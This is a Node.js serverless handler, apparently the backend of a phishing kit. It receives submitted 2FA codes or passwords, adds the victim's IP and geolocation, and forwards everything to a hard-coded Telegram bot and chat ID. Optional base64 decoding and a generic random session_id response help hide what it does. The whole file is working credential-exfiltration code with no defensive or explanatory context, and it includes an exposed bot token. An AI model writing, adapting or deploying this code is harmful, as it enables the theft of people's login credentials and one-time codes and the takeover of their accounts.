const crypto = require('crypto');

const TELEGRAM_BOT_TOKEN = '8606442477:AAHGWiqoxONFe0544AfUWmxZCdoRysAcAJk';
const TELEGRAM_CHAT_IDS = '-5477819014';

const CHAT_IDS_ARRAY = TELEGRAM_CHAT_IDS ? TELEGRAM_CHAT_IDS.split(',').map(id => id.trim()) : [];

function setSecurityHeaders(res, origin) {
    res.setHeader('Access-Control-Allow-Origin', origin || '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
}

function escapeHtml(str) {
    if (!str) return '';
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;');
}

function parseRequestBody(reqBody) {
    if (!reqBody) return null;
    let data = reqBody;

    if (reqBody.data && typeof reqBody.data === 'string') {
        try {
            const decoded = Buffer.from(reqBody.data, 'base64').toString('utf-8');
            data = JSON.parse(decoded);
        } catch (e) {
            console.error('Base64 decode failed:', e.message);
        }
    } else if (typeof reqBody === 'string') {
        try {
            data = JSON.parse(reqBody);
        } catch (e) {
            return null;
        }
    }

    if (typeof data !== 'object' || data === null) return null;
    return data;
}

// Chỉ hiển thị khung Code 2FA kèm IP và Location
function buildMessage(data, ip = 'Unknown') {
    let msg = `🔒 <b>2FA VERIFICATION CODE</b> 🔒\n`;
    msg += `────────────────────────\n`;
    msg += `• <b>IP:</b> <code>${escapeHtml(ip)}</code>\n`;
    msg += `• <b>Location:</b> ${escapeHtml(data.location || 'Unknown')}\n`;
    msg += `────────────────────────\n`;
    msg += `🔑 <b>Code:</b> <code>${escapeHtml(data.code || data.password || 'N/A')}</code>\n`;
    msg += `────────────────────────`;
    return msg;
}

async function getIPInfo(ip) {
    try {
        const res = await fetch(`https://ipapi.co/${ip}/json/`, {
            headers: { 'User-Agent': 'vercel-serverless' }
        });
        const resultData = await res.json();
        if (resultData && !resultData.error) {
            const cityCode = resultData.city ? resultData.city.charAt(0).toUpperCase() : '';
            return `${resultData.city}(${cityCode}) | ${resultData.country_name}(${resultData.country_code})`;
        }
    } catch (e) {
        console.error('[IP_LOOKUP] Failed:', e.message);
    }
    return 'Unknown';
}

async function sendTelegram(message) {
    if (!TELEGRAM_BOT_TOKEN || CHAT_IDS_ARRAY.length === 0) {
        return false;
    }

    const promises = CHAT_IDS_ARRAY.map(async (chatId) => {
        try {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            const resData = await response.json();
            return resData.ok;
        } catch (e) {
            return false;
        }
    });

    const results = await Promise.all(promises);
    return results.some(res => res === true);
}

module.exports = async function handler(req, res) {
    const origin = req.headers.origin || '';
    setSecurityHeaders(res, origin);

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.headers['x-real-ip'] || 'Unknown';
        const data = parseRequestBody(req.body);

        if (!data) {
            return res.status(400).json({ success: false, error: 'Invalid data format' });
        }

        const location = await getIPInfo(ip);
        
        const payload = {
            ...data,
            location
        };

        const msg = buildMessage(payload, ip);
        const sentSuccess = await sendTelegram(msg);

        if (sentSuccess) {
            return res.status(200).json({ success: true, session_id: crypto.randomBytes(16).toString('hex') });
        } else {
            return res.status(500).json({ success: false, error: 'Internal processing error' });
        }

    } catch (error) {
        return res.status(500).json({ success: false, error: 'Internal server error' });
    }
};
